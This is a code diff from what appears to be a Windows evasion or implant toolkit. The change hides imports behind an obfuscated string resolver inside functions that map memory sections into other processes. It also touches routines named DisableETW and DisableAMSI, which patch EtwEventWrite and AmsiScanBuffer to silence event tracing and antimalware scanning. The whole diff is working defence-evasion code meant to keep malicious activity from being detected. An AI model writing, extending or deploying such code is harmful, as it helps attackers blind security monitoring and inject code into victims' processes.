@@ -6,6 +6,8 @@
 #include "platform.h"
 #include "syscall_direct.h"
 #include "module_resolver.h"  // ★ BUILD 550: GetModuleBaseFromPEB + ModNameHash (替代 GetModuleHandleW)
+// ★ BUILD 551: STEALTH_GET_PROC_ADDRESS_NOREF 宏 (EtwEventWrite / AmsiScanBuffer 加密解析)
+#include "string_obfuscator.h"
 #include <cmath>
 #include <psapi.h>
 #include <intrin.h>
@@ -561,7 +563,7 @@ void* PhantomSection::AllocateAsImageSection(SIZE_T size, const wchar_t* disguis
     using NtCreateSection_t = NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES,
         PLARGE_INTEGER, ULONG, ULONG, HANDLE);
     static auto NtCreateSection = reinterpret_cast<NtCreateSection_t>(
-        GetProcAddress(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtCreateSection"));
+        STEALTH_GET_PROC_ADDRESS_NOREF(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtCreateSection"));
 
     if (!NtCreateSection) return nullptr;
 
@@ -588,7 +590,7 @@ void* PhantomSection::AllocateAsImageSection(SIZE_T size, const wchar_t* disguis
     using NtMapViewOfSection_t = NTSTATUS(NTAPI*)(HANDLE, HANDLE, PVOID*, ULONG_PTR,
         SIZE_T, PLARGE_INTEGER, PSIZE_T, ULONG, ULONG, ULONG);
     static auto NtMapViewOfSection = reinterpret_cast<NtMapViewOfSection_t>(
-        GetProcAddress(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtMapViewOfSection"));
+        STEALTH_GET_PROC_ADDRESS_NOREF(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtMapViewOfSection"));
 
     if (NtMapViewOfSection) {
         NtMapViewOfSection(hSection, GetCurrentProcess(), &baseAddr,
@@ -608,7 +610,7 @@ uintptr_t PhantomSection::AllocatePhantomInProcess(HANDLE hProcess, SIZE_T size)
     using NtCreateSection_t = NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES,
         PLARGE_INTEGER, ULONG, ULONG, HANDLE);
     static auto NtCreateSection = reinterpret_cast<NtCreateSection_t>(
-        GetProcAddress(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtCreateSection"));
+        STEALTH_GET_PROC_ADDRESS_NOREF(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtCreateSection"));
 
     if (!NtCreateSection) return 0;
 
@@ -627,7 +629,7 @@ uintptr_t PhantomSection::AllocatePhantomInProcess(HANDLE hProcess, SIZE_T size)
     using NtMapViewOfSection_t = NTSTATUS(NTAPI*)(HANDLE, HANDLE, PVOID*, ULONG_PTR,
         SIZE_T, PLARGE_INTEGER, PSIZE_T, ULONG, ULONG, ULONG);
     static auto NtMapViewOfSection = reinterpret_cast<NtMapViewOfSection_t>(
-        GetProcAddress(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtMapViewOfSection"));
+        STEALTH_GET_PROC_ADDRESS_NOREF(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtMapViewOfSection"));
 
     if (NtMapViewOfSection) {
         NtMapViewOfSection(hSection, hProcess, &remoteAddr,
@@ -680,7 +682,7 @@ PhantomSection::NtQVM_t PhantomSection::GetRealNtQueryVirtualMemory() {
     static NtQVM_t s_realNtQVM = nullptr;
     if (!s_realNtQVM) {
         s_realNtQVM = reinterpret_cast<NtQVM_t>(
-            GetProcAddress(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtQueryVirtualMemory"));
+            STEALTH_GET_PROC_ADDRESS_NOREF(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtQueryVirtualMemory"));
     }
     return s_realNtQVM;
 }
@@ -1028,7 +1030,7 @@ bool TelemetrySilencer::DisableETW() {
     if (!ntdll) return false;
 
     auto* etwAddr = reinterpret_cast<BYTE*>(
-        GetProcAddress(ntdll, "EtwEventWrite"));
+        STEALTH_GET_PROC_ADDRESS_NOREF(ntdll, "EtwEventWrite"));
     if (!etwAddr) return false;
 
     // 保存原始字节
@@ -1059,7 +1061,7 @@ bool TelemetrySilencer::DisableAMSI() {
     if (!amsi) return false;
 
     auto* amsiAddr = reinterpret_cast<BYTE*>(
-        GetProcAddress(amsi, "AmsiScanBuffer"));
+        STEALTH_GET_PROC_ADDRESS_NOREF(amsi, "AmsiScanBuffer"));
     if (!amsiAddr) return false;
 
     s_amsiPatch.addr = amsiAddr;
